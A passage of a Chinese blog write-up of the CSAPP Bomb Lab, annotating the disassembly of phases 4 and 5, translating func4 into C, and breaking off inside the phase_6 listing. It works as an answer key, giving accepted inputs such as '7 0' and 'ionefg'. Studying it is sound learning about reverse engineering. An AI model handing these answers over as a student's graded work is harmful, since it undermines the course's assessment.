<blockquote>
<p>这说明第一个输入值必须是小于等于 7 且 大于等于 0，即 [7, 0]，那么就一共有 8 个答案</p>
</blockquote>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240306222211293.png" class="" title="image-20240306222211293">

<ul>
<li><p>我还发现了一个小彩蛋！！！当我们第一个输入值为 8，%rsp * 8 + 0x402470 &#x3D; 0x4024c0，通过命令 x&#x2F;s 0x4024c0 <strong>得到 “So you think you can stop the bomb with ctrl-c, do you?”</strong></p>
<blockquote>
<p>所以你认为你可以用 ctrl-c 阻止炸弹，是吗？</p>
<p>命令 x&#x2F;s 0x…… 让其通过字符串的形式展示，而对于其他第一个值位于 [7, 0] 的 x&#x2F;s 都得不到其他有趣的结果</p>
</blockquote>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240306222417344.png" class="" title="image-20240306222417344">

<h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><ul>
<li>阅读 phase_4 相关代码，也是一样</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span></span><br><span class="line">input = read_line();</span><br><span class="line">phase_4(input);</span><br><span class="line">phase_defused();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;So you got that one.  Try this one.\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="phase-4-1"><a href="#phase-4-1" class="headerlink" title="phase_4"></a>phase_4</h2><ul>
<li>分析 phase_4 的汇编代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp					# %rsp -= 0x18</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx				# %rcx = %rsp + 0xc </span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx				# %rdx = %rsp + 0x8</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi				# %esi = 0x4025cf（应该是 %d %d 之类的参数）</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;	# 调用 sccanf</span><br><span class="line">  </span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax			</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;		# if %eax != 0x2，跳转到 401035 </span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)			</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;		# if *(%rsp + 0x8) &lt;= 0xe，跳转到 40103a</span><br><span class="line">  </span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line">  </span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx					# %edx = 0xe</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi					# %esi = 0x0</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi				# %edi = *(%rsp + 0x8)</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;				# 调用 func4</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax			</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;		# if %eax != 0，跳转到 401058</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)			</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;		# if *(%rsp + 0xc) == 0x0，跳转到 40105d</span><br><span class="line">  </span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line">  </span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp					# %rsp += 0x18（释放内存）</span><br><span class="line">  401061:	c3                   	retq   								# return </span><br></pre></td></tr></table></figure>

<ul>
<li><p>为 phase_4 的栈帧分配空间，%rcx &#x3D; %rsp + 0xc，%rdx &#x3D; %rsp + 0x8，%esi &#x3D; 0x4025cf，%eax &#x3D; 0x0，调用函数 sscanf</p>
<blockquote>
<p>%rcx 和 %rdx 作为参数获取我们的输入值，%esi 可能是保存着类似 %d %d 的参数</p>
<p>我们通过 命令 x&#x2F;s 0x4025cf 得到  %d %d，果不其然需要我们输入两个 int（其实我们通过 %rcx %rdx 两个寄存器就可以猜到仅仅需要输入两个值）</p>
</blockquote>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240307104752528.png" class="" title="image-20240307104752528">

<ul>
<li><p>if %eax !&#x3D; 0x2，<strong>跳转到 401035</strong>，else <strong>……</strong></p>
</li>
<li><p><strong>跳转到 401035</strong>，<strong>调用函数 explode_bomb，炸弹爆炸</strong></p>
<blockquote>
<p>结合 %eax !&#x3D; 0x2 的判断，%eax 的值必须 &#x3D;&#x3D; 2，因此我们可以猜测返回值 %eax 的值代表着我们输入值的个数，如果不是两个，炸弹爆炸</p>
</blockquote>
</li>
<li><p><strong>if %eax &#x3D;&#x3D; 0x2</strong>，if *(%rsp + 0x8) &lt;&#x3D; 0xe， <strong>跳转到 40103a</strong>，else <strong>调用函数 explode_bomb，炸弹爆炸</strong></p>
<blockquote>
<p>*(%rsp + 0x8) 是我们输入的第一个值，因此它必须小于等于 0xe</p>
</blockquote>
</li>
<li><p><strong>跳转到 40103a</strong>，%edx &#x3D; 0xe，%esi &#x3D; 0x0，%edi &#x3D; *(%rsp + 0x8)，调用 func4</p>
<blockquote>
<p>func4 可能需要 3 个参数，%edi 赋值为我们输入的第一个值，%esi 赋值为 0，%edx 赋值为 0xe（14）</p>
</blockquote>
</li>
<li><p>if %eax !&#x3D; 0x0，<strong>跳转到 401058</strong>，else <strong>……</strong></p>
</li>
<li><p><strong>跳转到 401058</strong>，<strong>调用函数 explode_bomb，炸弹爆炸</strong></p>
<blockquote>
<p>因此我们调用 func4 的返回值必须 &#x3D;&#x3D; 0x0</p>
</blockquote>
</li>
<li><p><strong>if %eax &#x3D;&#x3D; 0x0</strong>，if *(%rsp + 0xc) &#x3D;&#x3D; 0x0， <strong>跳转到 40105d</strong>，else <strong>调用函数 explode_bomb，炸弹爆炸</strong></p>
<blockquote>
<p>*(%rsp + 0xc) 是我们输入的第二个值，因此它必须等于 0x0</p>
</blockquote>
</li>
<li><p><strong>跳转到 40105d</strong>，%rsp +&#x3D; 0x18，return</p>
<blockquote>
<p>释放内存并返回</p>
</blockquote>
</li>
<li><p>到目前为止，我们确定了第二个输入值必须为 0，第一个输入值还需要通过 func4 的汇编代码继续判断，且 func4 的返回值必须为 0</p>
</li>
</ul>
<h2 id="func4"><a href="#func4" class="headerlink" title="func4"></a>func4</h2><ul>
<li>分析 func4 的汇编代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:									# %edi = 第一个输入值，%esi = 0x0，%edx = 0xe</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp				# %rsp -= 0x8</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax				# %eax = %edx</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax				# %eax -= %esi</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx				# %ecx = %eax</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx				# %ecx &gt;&gt;= 0x1f（31）（逻辑右移）</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax				# %eax += %ecx</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax						# %eax &gt;&gt;= 1（算术右移）</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx		# %ecx = %rax + %rsi * 1</span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx			</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;		# if %ecx &lt;= %edi，跳转到 400ff2</span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx			# %edx = %rcx - 0x1</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;			# 调用 func4</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax				# %eax += %eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;		# 直接跳转到 401007</span><br><span class="line">  </span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax				# %eax = 0x0</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx			</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;		# if %ecx &gt;= %edi，跳转到 401007</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi			# %esi = %rcx + 0x1</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt;			# 调用 func4</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax	# %eax = %rax + %rax * 1 + 0x1</span><br><span class="line">  </span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp				# %rsp += 0x8（释放内存）</span><br><span class="line">  40100b:	c3                   	retq   							# return </span><br></pre></td></tr></table></figure>

<ul>
<li><p>为 func4 的栈帧分配空间，%eax &#x3D; %edx，%eax -&#x3D; %esi，%ecx &#x3D; %eax，%ecx &gt;&gt;&#x3D; 0x1f，%eax +&#x3D; %ecx，%eax &gt;&gt;&#x3D; 1，%ecx &#x3D; %rax + %rsi * 1</p>
<blockquote>
<p>经过上述一系列的计算，%ecx &#x3D; %eax &#x3D; 0x7</p>
</blockquote>
</li>
<li><p>if %ecx &lt;&#x3D; %edi，<strong>跳转到 400ff2</strong>，else <strong>……</strong></p>
<blockquote>
<p>这里比较 0x7 和我们第一个输入值之间的关系</p>
</blockquote>
<ul>
<li><p><strong>跳转到 400ff2</strong>，%eax &#x3D; 0x0，if %ecx &gt;&#x3D; %edi，<strong>跳转到 401007</strong>，else <strong>……</strong></p>
<blockquote>
<p>这里我们的第一个输入值 %edi 已经 &gt;&#x3D; %ecx &#x3D; 0x7 了</p>
</blockquote>
<ul>
<li><p><strong>跳转到 401007</strong>，%rsp +&#x3D; 0x8，return</p>
<blockquote>
<p>这里我们的第一个输入值 %edi &#x3D;&#x3D; %ecx &#x3D; 0x7</p>
<p>释放内存并返回，这里我们就返回了此时的 %eax &#x3D; 0x0，说明第一个值需要输入 7</p>
</blockquote>
</li>
</ul>
</li>
<li><p><strong>if %eax &lt; %edi</strong>，%esi &#x3D; %rcx + 0x1，调用函数 func4，%eax &#x3D; %rax + %rax * 1 + 0x1</p>
<blockquote>
<p>如果第一个输入值大于 7，会进入一个递归，第一次进入时 %esi 赋值为了 0x8，其他参数不变，返回值还需要 * 2 + 1</p>
</blockquote>
</li>
</ul>
</li>
<li><p><strong>if %ecx &gt; %edi</strong>，%edx &#x3D; %rcx - 0x1，调用函数 func4，%eax +&#x3D; %eax，直接跳转到 401007，return</p>
<blockquote>
<p>如果第一个输入值小于 7，也会进入一个递归，第一次进入时 %edx 的参数为 0x6，其他不变，返回值还需要 * 2</p>
</blockquote>
</li>
<li><p>分析到这里，我们就已经得到了答案了，第一个输入值可以为 7，至于还有没有其他答案，再说吧！！！（没有看懂这个递归函数想干什么 ……）</p>
</li>
</ul>
<h2 id="Result-3"><a href="#Result-3" class="headerlink" title="Result"></a>Result</h2><ul>
<li>phase_4 的一个正确输入为：<strong>7 0</strong></li>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240307121121882.png" class="" title="image-20240307121121882">

<h2 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li>通过 func4 的汇编代码翻译的 C 代码如下 （还是没看懂它想要干什么 ……）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始情况下，edi = 第一个输入值，esi = 0，edx = 14</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func4</span><span class="params">(<span class="type">int</span> edi, <span class="type">int</span> esi, <span class="type">int</span> edx)</span> &#123;</span><br><span class="line">    <span class="type">int</span> eax = edx - esi;</span><br><span class="line">    eax += eax &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    eax &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> ecx = eax + esi * <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ecx &lt;= edi) &#123;</span><br><span class="line">        eax = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (ecx &gt;= edi) &#123;</span><br><span class="line">            <span class="keyword">return</span> eax;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        	esi = ecx + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * func4(edi, esi, edx) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	edx = ecx - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(edi, esi, edx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><ul>
<li>同样的 C 代码</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Round and &#x27;round in memory we go, where we stop, the bomb blows! */</span></span><br><span class="line">input = read_line();</span><br><span class="line">phase_5(input);</span><br><span class="line">phase_defused();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Good work!  On to the next...\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="phase-5-1"><a href="#phase-5-1" class="headerlink" title="phase_5"></a>phase_5</h2><ul>
<li>分析 phase_5 的汇编代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   %rbx							# %rbx 入栈</span><br><span class="line">  401063:	48 83 ec 20          	sub    $0x20,%rsp					# %rsp -= 0x20（分配空间）</span><br><span class="line">  401067:	48 89 fb             	mov    %rdi,%rbx					# %rbx = %rdi</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax				# %rax = %fs:0x28</span><br><span class="line">  401071:	00 00 </span><br><span class="line">  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)				# *(%rsp + 0x18) = %rax（将哨兵入栈）</span><br><span class="line">  401078:	31 c0                	xor    %eax,%eax					# %eax = 0x0</span><br><span class="line">  40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;		# 调用 string_length</span><br><span class="line">  40107f:	83 f8 06             	cmp    $0x6,%eax			</span><br><span class="line">  401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;		# if %eax == 0x6，跳转到 4010d2</span><br><span class="line">  401084:	e8 b1 03 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line">  </span><br><span class="line">  401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;		# 直接跳转到 1010d2</span><br><span class="line">  </span><br><span class="line">  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx			# %ecx = *(%rbx + %rax * 1)</span><br><span class="line">  40108f:	88 0c 24             	mov    %cl,(%rsp)					# *(%rsp) = %cl（%cl 是 %rcx 的低 8 位）</span><br><span class="line">  401092:	48 8b 14 24          	mov    (%rsp),%rdx					# %rdx = *(%rsp)</span><br><span class="line">  401096:	83 e2 0f             	and    $0xf,%edx					# %edx &amp;= 0xf</span><br><span class="line">  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx			# %edx = *(%rdx + 0x4024b0)</span><br><span class="line">  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)		# *(%rsp + %rax * 1 + 0x10) = %dl（%dl 是 %rdx 的低 8 位）</span><br><span class="line">  </span><br><span class="line">  4010a4:	48 83 c0 01          	add    $0x1,%rax					# %rax += 0x1</span><br><span class="line">  4010a8:	48 83 f8 06          	cmp    $0x6,%rax			</span><br><span class="line">  4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;		# if %rax != 0x6，跳转到 40108b</span><br><span class="line">  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)				# *(%rsp + 0x16) = 0x0</span><br><span class="line">  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi				# %esi = 0x40245e</span><br><span class="line">  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi				# %rdi = %rsp + 0x10</span><br><span class="line">  4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;	# 调用 strings_not_equal</span><br><span class="line">  4010c2:	85 c0                	test   %eax,%eax			</span><br><span class="line">  4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;		# if %eax == 0，跳转到 4010d9</span><br><span class="line">  4010c6:	e8 6f 03 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line">  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)		</span><br><span class="line">  4010d0:	eb 07                	jmp    4010d9 &lt;phase_5+0x77&gt;		# 直接跳转到 4010d9</span><br><span class="line">  </span><br><span class="line">  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt;		# 直接跳转到 40108b</span><br><span class="line">  </span><br><span class="line">  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax				# %rax = *(%rsp + 0x18)</span><br><span class="line">  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax				# %rax ^= %fs:0x28（测试哨兵）</span><br><span class="line">  4010e5:	00 00 </span><br><span class="line">  4010e7:	74 05                	je     4010ee &lt;phase_5+0x8c&gt;		# if %rax == 0。跳转到 4010ee</span><br><span class="line">  4010e9:	e8 42 fa ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;# 调用 stack_cnk_fail</span><br><span class="line">  4010ee:	48 83 c4 20          	add    $0x20,%rsp					# %rsp += 0x20</span><br><span class="line">  4010f2:	5b                   	pop    %rbx							# 将 %rbx 原值重新弹入 %rbx</span><br><span class="line">  4010f3:	c3                   	retq   								# return</span><br></pre></td></tr></table></figure>

<ul>
<li><p>%rbx &#x3D; %rdi，%rax &#x3D; %fs：0x28，*(%rsp + 0x18) &#x3D; %rax，%eax &#x3D; 0x0，调用函数 string_length</p>
<blockquote>
<p>%fs：0x28 是一个哨兵值（金丝雀值），放入栈中，最后通过检测它是否被修改来判断栈是否溢出</p>
<p>函数 string_length 返回我们输入字符串的长度，这里隐式的说明了我们输入的是字符串</p>
</blockquote>
</li>
<li><p>if %eax &#x3D;&#x3D; 0x6，<strong>跳转到 4010d2</strong>，else <strong>调用函数 explode_bomb，炸弹爆炸</strong></p>
<blockquote>
<p>这里说明了我们输入字符串的长度必须是 6</p>
</blockquote>
</li>
<li><p><strong>跳转到 4010d2</strong>，%eax &#x3D; 0x0，<strong>直接跳转到 40108b</strong></p>
</li>
<li><p><strong>跳转到 40108b</strong>，%ecx &#x3D; <em>(%rbx + %rax * 1)，</em>(%rsp) &#x3D; %cl，%rdx &#x3D; *(%rsp)，%edx &amp;&#x3D; 0xf，%edx &#x3D; *(%rdx + 0x4024b0)，      *(%rsp + %rax * 1 + 0x10) &#x3D; %dl，%rax +&#x3D; 1，if %rax !&#x3D; 0x6，<strong>跳转到 40108b</strong>，else <strong>……</strong></p>
<blockquote>
<p>这里是一个循环，进行了大量的运算，刚进入时 %eax &#x3D;&#x3D; 0，它循环了 6 次，现在看着可能有些头晕，一会再回过头再深入分析</p>
</blockquote>
</li>
<li><p><strong>if %rax &#x3D;&#x3D; 0x6</strong>，*(%rsp + 0x16) &#x3D; 0x0，%esi &#x3D; 0x40245e，%rdi &#x3D; %rsp + 0x10，调用函数 strings_not_equal，if %eax &#x3D;&#x3D; 0， <strong>跳转到 4010d9</strong>，else <strong>调用函数 explode_bomb，炸弹爆炸</strong></p>
<blockquote>
<p>函数 strings_not_equal 判断 %rdi 和 %rsi 是否相等，返回值为 0 表示两字符串相等</p>
<p>这里说明 %rsp + 0x10 所指向的字符串和 0x40245e 指向的字符串需要相等，我们用命令 x&#x2F;s 0x40245e 得到 <strong>flyers</strong></p>
<p>因此我们需要让 %rsp + 0x10 指向 flyers</p>
</blockquote>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240308133544768.png" class="" title="image-20240308133544768">

<ul>
<li><p><strong>跳转到 4010d9</strong>，%rax &#x3D; *(%rsp + 0x18)，%rax ^&#x3D; %fs:0x28，if %rax &#x3D;&#x3D; 0，<strong>跳转到 4010ee</strong>，else <strong>调用函数 stack_cnk_fail，栈溢出</strong></p>
<blockquote>
<p>测试哨兵值（金丝雀值）是否被修改，如果已经被修改，则调用一个错误处理例程</p>
</blockquote>
</li>
<li><p><strong>跳转到 4010ee</strong>，%rsp +&#x3D; 0x20，return</p>
<blockquote>
<p>释放空间并返回</p>
</blockquote>
</li>
<li><p><strong>重新回到 40108b</strong>，仔细分析这个循环到底做了什么</p>
</li>
<li><p>%ecx &#x3D; *(%rbx + %rax *1)， *(%rsp) &#x3D; %cl，%rdx &#x3D; *(%rsp)</p>
<blockquote>
<p>%rbx 存放我们输入字符串的起始地址，%rax 初始为 0x0，每次循环都会 %rax++</p>
<p>%cl 是 %ecx 的低 8 位（1字节）</p>
<p>这里是将我们输入字符串的每个字符取出来赋值给 %rdx（输入字符串长度为 6，这里也恰好 6 次循环）</p>
</blockquote>
</li>
<li><p>%edx &amp;&#x3D; 0xf，%edx &#x3D; *(%rdx + 0x4024b0)</p>
<blockquote>
<p>%edx &amp;&#x3D; 1111，保留 %edx 的低 4 位，其余赋值为 0，输入字符串的每个字符只有低 4 位有效</p>
<p>通过 x&#x2F;s 0x4024b0 ，我们发现 0x4024b0 是一个字符数组的起始地址</p>
<p>这里通过输入字符串的每个字符的 ASCLL 码的低 4 位作为偏移量，从数组中取一个字符赋值给 %edx（movbl）</p>
</blockquote>
</li>
<li><p>*(%rsp + %rax * 1 + 0x10) &#x3D; %dl</p>
<blockquote>
<p>%dl 为 %edx 的低 8 位</p>
<p>这里每次将 %edx 中一个字符赋值到栈的相应位置，从 %rsp + 0x10 到 %rsp + 0x15 赋值 6 次</p>
</blockquote>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240308140330045.png" class="" title="image-20240308140330045">

<ul>
<li><p>如果我们还是将这个数组仅仅当作一个 <strong>“彩蛋”</strong> 的话是不行的，这个数组为我们提供了 flyers 需要的每个字符，每个字符对应的偏移量为：f - 9，l - 15，y - 14，e - 5，r - 6，s - 7</p>
</li>
<li><p>我们可以让它们加上 16 的倍数通过 ASCLL 码得到不同的字符组合 ，因为经过上述的运算，字符仅仅有低 4 位有效</p>
<blockquote>
<p>一个字符可以通过 2 位 16 进制表示，加上 16 的倍数仅仅会体现在高 4 位，不会影响低 4 位</p>
</blockquote>
</li>
</ul>
<h2 id="Result-4"><a href="#Result-4" class="headerlink" title="Result"></a>Result</h2><ul>
<li><p>如果都加上 96，通过相应的 ASCLL 码得到 i - 0x69，o - 0x6f，n - 0x6e，e - 0x65，f - 0x66，g - 0x67，所以一个答案为：<strong>ionefg</strong></p>
</li>
<li><p><strong>运行结果</strong></p>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240308174232278.png" class="" title="image-20240308174232278">

<ul>
<li>如果加上不同的倍数，9 - 0x39，o - 0x6f，N - 0x4e，5 - 0x35，6 - 0x36，7 - 0x37，得到 <strong>9oN567</strong>，也是正确的！所以只要加上 16 的倍数就好了！</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240308174044758.png" class="" title="image-20240308174044758">

<h1 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h1><ul>
<li>phase_6 的 C 代码</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This phase will never be used, since no one will get past the</span></span><br><span class="line"><span class="comment">  * earlier ones.  But just in case, make this one extra hard. */</span></span><br><span class="line"> input = read_line();</span><br><span class="line"> phase_6(input);</span><br><span class="line"> phase_defused();</span><br></pre></td></tr></table></figure>

<h2 id="phase-6-1"><a href="#phase-6-1" class="headerlink" title="phase_6"></a>phase_6</h2><ul>
<li>仔细分析 phase_6 的汇编代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 